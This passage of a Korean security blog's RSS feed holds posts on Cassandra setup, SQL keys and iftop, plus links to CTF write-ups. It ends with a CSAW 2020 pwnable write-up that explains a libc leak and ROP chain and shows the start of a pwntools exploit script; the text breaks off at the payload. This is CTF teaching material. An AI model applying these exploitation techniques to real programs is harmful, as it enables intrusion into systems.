      <content:encoded><![CDATA[<p>사실 풀고나니 꽤나 쉬웠던 것 같은 문제인데, 요즘 시스템쪽을 하는둥 마는둥 하다보니 익스코드 짜는데</p><p>오래 걸려버려서 대회 중에는 인증을 못해봤었다.. (틈틈히 챙겨야 할듯)</p><p><a href="https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5">https://www.notion.so/jhyeon/BISC-2020-oldschool-write-up-7b4dc57cf9834eab9f1260adf1b609f5</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/BISC2020/">BISC2020</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ROP/">ROP</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/11/21/bob-bisc-201129/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>POX(Power of xx) 2020 Write up</title>
      <link>https://blog.jhyeon.dev/2020/11/21/poxctf-201121/</link>
      <guid>https://blog.jhyeon.dev/2020/11/21/poxctf-201121/</guid>
      <pubDate>Fri, 20 Nov 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;POX 2020 출제자 Write up 자료입니다.&lt;/p&gt;
&lt;p&gt;아래 노션에서 풀이를 확인하실 수 있습니다.&lt;/p&gt;
&lt;p&gt;질문 사항이 있으시면 &lt;a href=&quot;mailto:&amp;#115;&amp;#116;&amp;#x6a;&amp;#x68;&amp;#121;&amp;#101;&amp;#111</description>
        
      
      
      
      <content:encoded><![CDATA[<p>POX 2020 출제자 Write up 자료입니다.</p><p>아래 노션에서 풀이를 확인하실 수 있습니다.</p><p>질문 사항이 있으시면 <a href="mailto:&#115;&#116;&#x6a;&#x68;&#121;&#101;&#111;&#110;&#x40;&#107;&#x61;&#107;&#x61;&#x6f;&#46;&#99;&#x6f;&#x6d;">&#115;&#116;&#x6a;&#x68;&#121;&#101;&#111;&#110;&#x40;&#107;&#x61;&#107;&#x61;&#x6f;&#46;&#99;&#x6f;&#x6d;</a> 으로 메일을 보내주세요!</p><p><a href="https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417">https://www.notion.so/jhyeon/POX-2020-Write-Up-300e65d33b6c4dd185d886cd2e7a6417</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/POX2020/">POX2020</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/11/21/poxctf-201121/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NoSQL - Cassandra Engine</title>
      <link>https://blog.jhyeon.dev/2020/09/25/cassandra-200925/</link>
      <guid>https://blog.jhyeon.dev/2020/09/25/cassandra-200925/</guid>
      <pubDate>Thu, 24 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Cassandra&quot;&gt;&lt;a href=&quot;#Cassandra&quot; class=&quot;headerlink&quot; title=&quot;Cassandra&quot;&gt;&lt;/a&gt;Cassandra&lt;/h2&gt;&lt;h3 id=&quot;Cassandra란&quot;&gt;&lt;a href=&quot;#Cassandra란&quot; cla</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Cassandra"><a href="#Cassandra" class="headerlink" title="Cassandra"></a>Cassandra</h2><h3 id="Cassandra란"><a href="#Cassandra란" class="headerlink" title="Cassandra란?"></a>Cassandra란?</h3><p>Cassandra(Free-Open Source Distributed NoSQL Database) 는 분산형 오픈소스 NoSQL Database이며,</p><p>단일 장애점(Single Point of Failure, SPOF) 없이 고성능을 제공하며 많은 서버들간에 대용량 데이터를 관리하기 위해 설계되었습니다.</p><p>Cassandra는 여러 데이터 센터(Data Center)에 걸쳐 Cluster를 지원하고 있으며 대용량의 데이터, 구조화, 비정형 데이터를 관리하는데 적합합니다.</p><h3 id="Cassandra의-장점-및-단점"><a href="#Cassandra의-장점-및-단점" class="headerlink" title="Cassandra의 장점 및 단점"></a>Cassandra의 장점 및 단점</h3><p>장점 : Consistent Hashing 구조를 이용한 Ring구조와 Gossip Protocol을 구현하였기 때문에,</p><p>각 노드의 장비추가, 제거 등이 자유롭고 데이터 센터까지 고려할 수 있는 데이터 복제 정책을 사용하고 있어 안정성 측면에서 많은 장점을 가지고 있습니다.</p><p>Cassandra를 이용하면 Sharing, Master-Slave와 같은 정책 없이도 장애 대응이 가능하며 장비를 늘리고 줄이는 것에 큰 비용이 들지 않습니다.</p><p>단점 : Cassandra는 테이블 간 Join이나 Transaction을 지원하지 않고, Index 등의 검색을 위한 기능도 매우 단출하며,</p><p>Cassandra의 구조상 RDBMS와 같은 페이징(Paging)을 구현하는 것이 어렵고 Keyspace, Table을 과도하게 생성할 경우 메모리 오버플로우가 발생할 수 있습니다.</p><h3 id="Cassandra-Data-Structure"><a href="#Cassandra-Data-Structure" class="headerlink" title="Cassandra Data Structure"></a>Cassandra Data Structure</h3><img src="/img/post/cassandra/1.png" class="lazyload placeholder" data-srcset="/img/post/cassandra/1.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"><p>Cassandra의 데이터 구조는 다음 사진과 같습니다.</p><p>Keyspace -&gt; Table -&gt; Row key -&gt; Column(Name, Value)로 구성되어 있습니다.</p><p>이 때 Keyspace와 Table에 대한 정보는 모든 Cassandra Node의 Memory에 저장되며 실제 데이터가 저장되는 Row는 각 Row-key를 가지고,</p><p>Hash(token)을 기준으로 각 노드에 분산 저장되어있습니다. 그리고 Row에 속하는 Column은 Column Name을 기준으로 정렬되어 저장됩니다.</p><h3 id="Cassandra-Column-Super-Column"><a href="#Cassandra-Column-Super-Column" class="headerlink" title="Cassandra Column, Super Column"></a>Cassandra Column, Super Column</h3><p>Cassandra의 컬럼과 슈퍼컬럼 두 컬럼 모두 Name, Value로 이루어진 튜플형입니다.</p><p>이 두 컬럼의 차이점은 문자열(String)과 Map 형태의 차이점입니다.</p><p>즉, 슈퍼컬럼의 값에는 다양한 형태의 데이터 타입을 가질 수 있습니다.</p><h3 id="Cassandra-설치"><a href="#Cassandra-설치" class="headerlink" title="Cassandra 설치"></a>Cassandra 설치</h3><ul><li><a href="https://cassandra.apache.org/download/">https://cassandra.apache.org/download/</a></li></ul><h3 id="Cassandra-예제"><a href="#Cassandra-예제" class="headerlink" title="Cassandra 예제"></a>Cassandra 예제</h3><p>Cassandra CQL Shell에 접속하는 방법은 다음과 같습니다. (Debian/Ubuntu 기준)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh</span><br></pre></td></tr></table></figure><p>이 때, 사용자 인증을 거치지않고 쉘에 접속하게 되는데 보안 설정을 위해서는 다음과 같이 설정합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vi /etc/cassandra/cassandra.yaml</span><br></pre></td></tr></table></figure><p>(104 Lines) authenticator: PasswordAuthenticator # AllowAllAuthenticator 주석 처리 후 변경</p><p>이후 CQL Shell에 접속하기 위해서는 다음과 같은 명령어로 접속합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh -u cassandra -p cassandra <span class="comment"># 기본 계정</span></span><br></pre></td></tr></table></figure><p>하지만 위와 같은 방법도 기본 계정으로 설정되어 있기 때문에 새로운 유저를 추가해서 사용하는 방식으로 변경합니다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; create user username with password <span class="string">&#x27;password&#x27;</span> superuser;</span><br><span class="line">cassandra@cqlsh&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cqlsh -u username -p password</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cassandra@cqlsh&gt; drop user cassandra;</span><br><span class="line">cassandra@cqlsh&gt; LIST USERS; /* 생성된 계정 확인 */</span><br></pre></td></tr></table></figure><p>이제 Cassandra에 대한 기본적인 보안을 거쳐 사용하실 수 있습니다!</p><h3 id="새로운-Keyspace-생성"><a href="#새로운-Keyspace-생성" class="headerlink" title="새로운 Keyspace 생성"></a>새로운 Keyspace 생성</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username@cqlsh&gt; create keyspace keyspace_name with replication = &#123;&#x27;class&#x27;: &#x27;SimpleStrategy&#x27;, &#x27;replication_factor&#x27;: 3&#125;;</span><br><span class="line">username<span class="variable">@cqlsh</span><span class="operator">&gt;</span> <span class="keyword">desc</span> keyspaces; <span class="comment">/* 생성된 keyspace 확인 */</span></span><br></pre></td></tr></table></figure><p>Replication이란 Keyspace를 생성할때 Replication의 복제 개수, 위치를 결정할 수 있는데 옵션은 아래와 같습니다.</p><p>SimpleStrategy 옵션은 단일 데이터 센터일 경우 사용하는 옵션이며,</p><p>멀티 데이터 센터를 사용할 경우 NetworkTopologyStrategy 를 사용하면 됩니다.</p><p>또, replication_factor란 동일한 데이터의 사본(복사본)을 수신할 클러스터의 시스템 수를 의미합니다.</p><h3 id="새로운-Table-생성"><a href="#새로운-Table-생성" class="headerlink" title="새로운 Table 생성"></a>새로운 Table 생성</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="variable">@cqlsh</span><span class="operator">&gt;</span> use keyspace_name; <span class="comment">/* 이전에 만든 keyspace로 접속 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> test.test_table(idx <span class="type">int</span>, name text, context text); <span class="comment">/* 테이블 생성 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">desc</span> test.test_table;</span><br></pre></td></tr></table></figure><h3 id="생성한-Table에-데이터-삽입"><a href="#생성한-Table에-데이터-삽입" class="headerlink" title="생성한 Table에 데이터 삽입"></a>생성한 Table에 데이터 삽입</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">insert</span> <span class="keyword">into</span> test.test_table (idx, name, context) <span class="keyword">values</span> (<span class="number">1</span>, <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;bobgood&#x27;</span>); <span class="comment">/* 데이터 삽입 */</span></span><br><span class="line">username<span class="variable">@cqlsh</span>:keyspace_name<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.test_table; <span class="comment">/* 테이블의 모든 행 조회 */</span></span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://meetup.toast.com/search?searchText=Cassandra">https://meetup.toast.com/search?searchText=Cassandra</a></p></li><li><p><a href="http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98">http://www.incodom.kr/Cassandra_%EC%A0%95%EC%9D%98</a></p></li><li><p><a href="https://newly0513.tistory.com/37">https://newly0513.tistory.com/37</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/NoSQL/">NoSQL</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Cassandra/">Cassandra</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/25/cassandra-200925/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DB Primary Key, Foreign Key</title>
      <link>https://blog.jhyeon.dev/2020/09/24/db-key-200924/</link>
      <guid>https://blog.jhyeon.dev/2020/09/24/db-key-200924/</guid>
      <pubDate>Wed, 23 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;SQL-제약조건&quot;&gt;&lt;a href=&quot;#SQL-제약조건&quot; class=&quot;headerlink&quot; title=&quot;SQL 제약조건&quot;&gt;&lt;/a&gt;SQL 제약조건&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;Not Null&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;데이터에 Null 값</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="SQL-제약조건"><a href="#SQL-제약조건" class="headerlink" title="SQL 제약조건"></a>SQL 제약조건</h3><ol><li>Not Null</li></ol><ul><li>데이터에 Null 값이 들어갈 수 없다.</li></ul><ol start="2"><li>Unique</li></ol><ul><li>데이터에 중복되는 값이 들어갈 수 없다.</li></ul><ol start="3"><li>Primary Key(PK)</li></ol><ul><li>각 행 또는 레코드를 고유하게 식별하는 값 (1+2 제약조건 포함)</li></ul><ol start="4"><li>Foreign Key(FK)</li></ol><ul><li>다른 테이블의 레코드를 참조하여 무결성을 검사한다.</li></ul><ol start="5"><li>Check</li></ol><ul><li>데이터의 범위 또는 사용자 조건을 지정한다.</li></ul><h3 id="PK-Primary-Key-란"><a href="#PK-Primary-Key-란" class="headerlink" title="PK(Primary Key)란?"></a>PK(Primary Key)란?</h3><p>데이터베이스 테이블에서 각 행 또는 레코드를 고유하게 식별하는 테이블의 필드를 의미합니다.</p><p>기본 키(PK)는 반드시 고유한 값을 가지며, 기본 키로 설정된 열은 NULL(빈 값)을 가질 수 없습니다.</p><p>또, 하나의 테이블에는 반드시 하나의 기본 키(PK)만을 구성할 수 있습니다.</p><p>(추가) 중복 항목이 입력되지 않기 위해서 PK를 사용하는데 제약조건으로는 여러 개를 추가할 수 없지만,</p><p>테이블을 만들 때 다중 PK를 지정하게 되면 생성이 가능하고 지정한 모든 PK 컬럼에는 중복 데이터가 들어갈 수 없습니다.</p><h3 id="PK-Primary-Key-생성-예제"><a href="#PK-Primary-Key-생성-예제" class="headerlink" title="PK(Primary Key) 생성 예제"></a>PK(Primary Key) 생성 예제</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    userid <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">primary</span> <span class="keyword">key</span>(userid)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(</span><br><span class="line">    userid <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    username <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">primary</span> <span class="keyword">key</span>(userid, username)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>다음과 같이 test 테이블을 생성하고 userid의 속성을 기본 키(PK)로 지정하기 위한 예제입니다.</p><p>이 때, PK로 지정하고자 하는 컬럼은 반드시 “not null”의 제약조건을 가지고 있어야합니다.</p><p>(추가) 2번째 예시는 다중 복합키로 테이블을 구성할 떄의 예시입니다.</p><h3 id="FK-Foreign-Key-란"><a href="#FK-Foreign-Key-란" class="headerlink" title="FK(Foreign Key)란?"></a>FK(Foreign Key)란?</h3><p>테이블의 특정 행 또는 레코드를 서로 연결시켜주는 것을 외래키(Foreign Key)라고 부르고,</p><p>RDBMS(Relation Database Management System)에서 명시적으로 테이블을 연결해주는 장치를 의미합니다.</p><p>예를 들어서 사용자로부터 주문을 받고 처리하기까지의 과정이 있다고 가정하면,</p><p>고객 정보를 저장하는 테이블, 주문을 처리하는 테이블 두개로 나누어서 보자.</p><p>그럼 고객이 특정 상품에 대해서 주문을 했을 때 주문을 처리하는 테이블로 고객의 정보와 함께 어떤 상품인지에 대한 정보가 기록될 것 이고,</p><p>여기서 주문을 한 사용자 정보를 고객 테이블에서 외래키로 참조하여 가져온다면 주문 테이블에 있는 고객들은,</p><p>실제 고객 정보 테이블에 존재하는 사용자라고 볼 수 있으며 무결성이 검증된다는 의미이다.</p><h3 id="FK-Foreign-Key-생성-예제"><a href="#FK-Foreign-Key-생성-예제" class="headerlink" title="FK(Foreign Key) 생성 예제"></a>FK(Foreign Key) 생성 예제</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Customer_TB(</span><br><span class="line">id <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">name <span class="type">varchar</span>(<span class="number">5</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">age <span class="type">int</span>(<span class="number">3</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">phone <span class="type">varchar</span>(<span class="number">15</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">address <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">primary</span> <span class="keyword">key</span>(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> Order_TB(</span><br><span class="line">order_num <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="keyword">null</span> auto_increment,</span><br><span class="line">customer_id <span class="type">varchar</span>(<span class="number">25</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">order_date datetime <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">order_amount <span class="type">int</span>(<span class="number">4</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line"><span class="keyword">primary</span> <span class="keyword">key</span>(order_num),</span><br><span class="line"><span class="keyword">foreign</span> <span class="keyword">key</span>(customer_id) <span class="keyword">references</span> Customer_TB(id) <span class="keyword">ON</span> <span class="keyword">UPDATE</span> CASCADE <span class="keyword">ON</span> <span class="keyword">DELETE</span> CASCADE</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>두 예졔를 보면 위에서 간단한 예시로 설명을 했듯이 똑같이 SQL 구문으로 작성한 것이다.</p><p>여기서 ON UPDATE, ON DELETE 라는 옵션이 있는데 해당 옵션은 외래키(Foreign Key)의 제약조건에 의해</p><p>참조되는 테이블에서 수정, 삭제가 일어날 때 참조하고 있는 테이블도 시스템에서 자동으로 데이터에 대한 수정, 삭제를 수행함을 의미합니다.</p><ol><li><p>CASCADE : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블에서도 삭제와 수정이 같이 이루어집니다.</p></li><li><p>SET NULL : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 NULL로 변경됩니다.</p></li><li><p>NO ACTION : 참조되는 테이블에서 데이터를 삭제하거나 수정해도, 참조하는 테이블의 데이터는 변경되지 않습니다.</p></li><li><p>SET DEFAULT : 참조되는 테이블에서 데이터를 삭제하거나 수정하면, 참조하는 테이블의 데이터는 필드의 기본값으로 설정됩니다.</p></li><li><p>RESTRICT : 참조하는 테이블에 데이터가 남아 있으면, 참조되는 테이블의 데이터를 삭제하거나 수정할 수 없습니다.</p></li></ol><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="http://www.tcpschool.com/mysql/mysql_constraint_foreignKey">http://www.tcpschool.com/mysql/mysql_constraint_foreignKey</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/DB/">DB</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Primary-Key/">Primary Key</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Foreign-Key/">Foreign Key</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/24/db-key-200924/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Linux[iftop] Example</title>
      <link>https://blog.jhyeon.dev/2020/09/17/linux-iftop-200917/</link>
      <guid>https://blog.jhyeon.dev/2020/09/17/linux-iftop-200917/</guid>
      <pubDate>Wed, 16 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Install&quot;&gt;&lt;a href=&quot;#Install&quot; class=&quot;headerlink&quot; title=&quot;Install&quot;&gt;&lt;/a&gt;Install&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libpcap-dev</span><br><span class="line">$ sudo apt-get install iftop</span><br></pre></td></tr></table></figure><h3 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iftop <span class="comment"># 라이브로 모니터링 하기 때문에 root 권한이 필요하다.</span></span><br></pre></td></tr></table></figure><p>별도의 옵션 없이 실행했을때는 네트워크의 최상단 인터페이스를 기준으로 실시간 모니터링을 수행한다.</p><p>첫번째 라인은 서버의 호스트, 두번째 라인은 대상 호스트 네임(IP 주소), 세번째 라인은 패킷의 전송량을 표시해준다.</p><p>또한 하단의 TX, RX, TOTAL 정보들은 각각 전송량, 수신량, 총 송/수신량을 의미한다.</p><p>그리고 -f(filter) 옵션을 통해 특정 조건에 해당하는 네트워크 패킷만을 보여주는 옵션이 있다.</p><p>pcap-filter 형식의 문자열로 보면되고, 필터 옵션들은 다음과 같다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ man pcap-filter</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iftop -f <span class="string">&quot;src host 127.0.0.1&quot;</span></span><br><span class="line">$ sudo iftop -f <span class="string">&quot;dst host 8.8.8.8&quot;</span></span><br></pre></td></tr></table></figure><p>주로 사용될만한 것들을 정리하면 다음과 같다.</p><p>자세한 것은 manpage에 보면 상세히 나와있다!</p><h3 id="pcap-filter"><a href="#pcap-filter" class="headerlink" title="pcap-filter"></a>pcap-filter</h3><p>dst host hostname    목적지 호스트네임(IP주소)<br>src host hostname    출발지 호스트네임(IP주소)<br>dst port port    목적지 포트<br>src port port    출발지 포트<br>ip proto protocol    프로토콜 유형<br>ether dst ehost    이더넷 목적지 주소가 ehost인지 체크<br>ether src ehost    이더넷 출발지 주소가 ehost인지 체크<br>ether host ehost    이더넷 출발지 또는 목적지 주소가 ehost인지 체크<br>gateway hostname    게이트웨이 호스트네임(IP주소)</p><h3 id="interactive-mode"><a href="#interactive-mode" class="headerlink" title="interactive-mode"></a>interactive-mode</h3><p>n    DNS Resolution on/off<br>s    Source Host Hide/UnHide<br>d    Destination Host Hide/UnHide<br>t    Cycle Line<br>N    Port Resolution on/off<br>S    Port Display(SRC) on/off<br>D    Port Display(DST) on/off<br>p    Port Display on/off<br>&lt;    Sort by Source<br>| Sort by Destination<br>o | Order by frozen/unfrozen<br>P | Pause Display<br>h | help<br>b | bar on/off<br>B | bar show 2/10/40(s) average<br>T | cumulative totals show/hide<br>j,k | scroll display<br>f | net-filter<br>l | screen-filter<br>L | lin/log scales<br>! | shell command(default: disabled)<br>q | quit</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Linux/">Linux</category>
      
      <category domain="https://blog.jhyeon.dev/tags/iftop/">iftop</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/17/linux-iftop-200917/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CSAW CTF 2020 roppity Write up</title>
      <link>https://blog.jhyeon.dev/2020/09/14/csawctf-200914/</link>
      <guid>https://blog.jhyeon.dev/2020/09/14/csawctf-200914/</guid>
      <pubDate>Sun, 13 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;p&gt;DEMON 소속팀에서 팀원분들과 CTF를 나가게 되었습니다~~&lt;/p&gt;
&lt;p&gt;오랜만에 CTF를 봐서 그런지 감이 안잡히는 문제들</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><p>DEMON 소속팀에서 팀원분들과 CTF를 나가게 되었습니다~~</p><p>오랜만에 CTF를 봐서 그런지 감이 안잡히는 문제들도 많아서 많이 헤멨는데 조금 더 분발해야겠네요 ㅜ_ㅜ</p><p>앞으로 시간될때마다 팀원분들과 같이 CTF 참여해서 글 자주 포스팅 할 예정입니다 :)</p><h3 id="roppity-analysis"><a href="#roppity-analysis" class="headerlink" title="roppity(analysis)"></a>roppity(analysis)</h3><p>먼저 문제에서 주어지는 파일은 바이너리와 libc 파일입니다.</p><p>64bit 환경에서 컴파일 되었고 Memory Mitigation은 별 다른거 없이 NX BIT만 활성화 되어있습니다.</p><p>IDA로 넘어가서 조금 더 딥하게 분석해봅시다.</p><p>메인 함수 안에서 작동하는 매우 간단한 원리의 바이너리 인것을 확인할 수 있습니다.</p><p>여기서 공격 벡터로 사용할 수 있는 함수는 puts 함수인데, 해당 함수의 실제 주소를 leak 해서 rop 해주면 끝납니다!</p><p>필요한 부분들을 하나씩 찾아봅시다.</p><p>일단 입력값이 저장되는 v4 버퍼의 크기는 rbp-20(32byte) 입니다.</p><p>그리고 함수 릭을 할려면 plt, got 값을 각각 구해야하는데 gdb를 통해서 볼수도 있지만 pwntools를 이용하면 시간 절약이 가능합니다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.chal.csaw.io&#x27;</span>,<span class="number">5016</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br></pre></td></tr></table></figure><p>이런식으로 하면 puts 함수의 plt, got를 각각 구할 수 있습니다.</p><p>함수 오프셋도 똑같이 libc 파일을 불러와서 symbols로 구해주면 되니깐 이하 생략하겠습니다~</p><p>그리고 rop에서 중요한 부분은 함수 릭을 할때 함수의 인자를 정리해줘야 해서 pop gadget 필요한데 이것도 ROPgadget 도구를 이용하면 쉽게 구합니다.</p><p>puts 함수의 인자를 정리해줄려면 pop ret로 해주면 되기 때문에 pop rdi ret 가젯을 사용하면 됩니다.</p><p>그럼 이제 함수 릭까지의 익스코드를 정리해보면 아래와 같습니다</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span 